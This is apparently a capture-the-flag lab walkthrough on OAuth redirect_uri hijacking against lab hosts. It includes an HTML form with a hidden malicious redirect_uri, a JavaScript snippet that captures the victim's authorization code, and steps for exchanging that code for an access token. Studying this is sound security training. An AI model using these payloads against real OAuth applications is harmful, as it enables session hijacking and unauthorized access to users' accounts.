Tokens play a critical role in the OAuth 2.0 framework, acting as digital keys that grant access to protected resources. These tokens are issued by the authorization server and redirected to the client application based on the `redirect_uri` parameter. This redirection is crucial in the OAuth flow, ensuring that tokens are securely transmitted to the intended recipient. However, if the `redirect_uri` is not well protected, attackers can exploit it to hijack tokens.

## Role of Redirect_URI
The `redirect_uri` parameter is specified during the OAuth flow to direct where the authorization server should send the token after authorization. This URI must be pre-registered in the application settings to prevent open redirect vulnerabilities. During the OAuth process, the server checks that the provided `redirect_uri` matches one of the registered URIs.

## Vulnerability
An insecure `redirect_uri` can lead to severe security issues. If attackers gain control over any domain or URI listed in the `redirect_uri`, they can manipulate the flow to intercept tokens. Here’s how this can be exploited:

- Consider an OAuth application with the following registered redirect URIs as shown below:
	![](Pasted%20image%2020241201165923.png)
- **Attacker's Strategy**: If an attacker gains control over `dev.bistro.thm`, they can exploit the OAuth flow. By setting the `redirect_uri` to `http://dev.bistro.thm/callback`, the authorization server will send the token to this controlled domain.
- **Crafted Attack:** The attacker initiates an OAuth flow and ensures the `redirect_uri` points to their controlled domain. After the user authorizes the application, the token is sent to `http://dev.bistro.thm/callback`. The attacker can now capture this token and use it to access protected resources.

### Preparing the Payload (Attacker Perspective)
For this exercise, we assume that the attacker has compromised the domain `dev.bistro.thm:8002` and can host any HTML page on the server. Consider Tom, a victim to whom we will send a link. The attacker can craft a simple HTML page (`redirect_uri.html`) with the following code:
```html
    <form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get">
            <input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html">
            <input type="submit" value="Hijack OAuth">
        </form>
        ```

This form sends a hidden `redirect_uri` parameter with the value `http://dev.bistro.thm:8002/malicious_redirect.html` and submits a request to [http://coffee.thm:8000/oauthdemo/oauth_login/.](http://coffee.thm:8000/oauthdemo/oauth_login/)  The `malicious_redirect.html` page then intercepts the authorization code from the URL using the following code:

```javascript
<script>
    // Extract the authorization code from the URL
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    document.getElementById('auth_code').innerText = code;
    console.log("Intercepted Authorization Code:", code);
    // code to save the acquired code in database/file etc
</script>
```

 **1. Extracting the Authorization Code from the URL:**
	`const urlParams = new URLSearchParams(window.location.search);`
	This line creates an instance of `URLSearchParams`, which allows easy access to query parameters in the URL.
	    - **`window.location.search`:** Refers to the part of the URL after the `?` symbol (query string).  
		_Example:_ If the URL is `http://example.com?code=abc123`, `urlParams` will process `code=abc123`.

**2. Getting the `code` Parameter:**
	`const code = urlParams.get('code');`
	This extracts the value of the `code` parameter from the query string.  
	    _Example:_ If the query string is `?code=abc123`, the variable `code` will be set to `"abc123"`.

**3. Displaying the Authorization Code on the Page:**
	`document.getElementById('auth_code').innerText = code;`
	Finds an HTML element with the ID `auth_code` and sets its text content to the extracted authorization code.  
	    _Example:_ If the HTML contains `<span id="auth_code"></span>`, it will display the code inside that element.

**4. Logging the Authorization Code to the Console:**
	`console.log("Intercepted Authorization Code:", code);`
	Outputs the extracted authorization code to the browser's developer console for debugging or monitoring purposes.

﻿*Note:* 
	﻿Since the attacker has complete control over the subdomain, once he redirects a victim to the attacker-controlled domain, he will save the credentials in a database/file, etc., for later usage. Moreover, the redirection from redirect_uri to the original URL would be so quick that the victim would have no idea that his authorization code has been hijacked.

The attacker can send Tom the link ([http://dev.bistro.thm:8002/redirect_uri.html](http://dev.bistro.thm:8002/redirect_uri.html)) through social engineering tactics or a CSRF attack. The victim, unsuspecting of the malicious intent, clicks on the link, which takes them to the URL `dev.bistro.thm:8002/redirect_uri.html` 
In the attached VM, open the [link](http://dev.bistro.thm:8002/redirect_uri.html) in the browser as a victim. Here, you will see the following screen:
	![](Pasted%20image%2020241201171215.png)

In the attached VM, when the victim clicks the "**Login via OAuth**" button, the form calls to `http://coffee.thm:8000/oauthdemo/oauth_login/` but with a falsified `redirect_uri`. Once the victim enters his credentials (`victim:victim123`) for the OAuth provider, it directs the OAuth authorization code to the attacker's controlled URL (`http://dev.bistro.thm:8002/malicious_redirect.html`), allowing the attacker to intercept and misuse the authorization code as shown below:
	![](Pasted%20image%2020241201171257.png)

## Attacker Perspective
From the attacker’s machine, they can utilize can utilize the intercepted authorization code to call the `/callback` endpoint and exchange it for a valid access token. In an OAuth flow, as we saw earlier, the `/callback` endpoint is always available, accepting the code parameter and returning an access token. With this token, the attacker gains unauthorized access to the user's protected resources. To get the access token, visit the URL [http://bistro.thm:8000/oauthdemo/callbackforflag/?code=xxxxx](http://bistro.thm:8000/oauthdemo/callbackforflag/?code=xxxx) and replace the `code` parameter with the acquired authorization code.
	![](Pasted%20image%2020241201171358.png)

- Accessing malicious redirect page --> intercept the victim's code 
	![](Pasted%20image%2020241201172136.png)
- using the victim's code to impersonate and hijack his session
	![](Pasted%20image%2020241201172246.png)
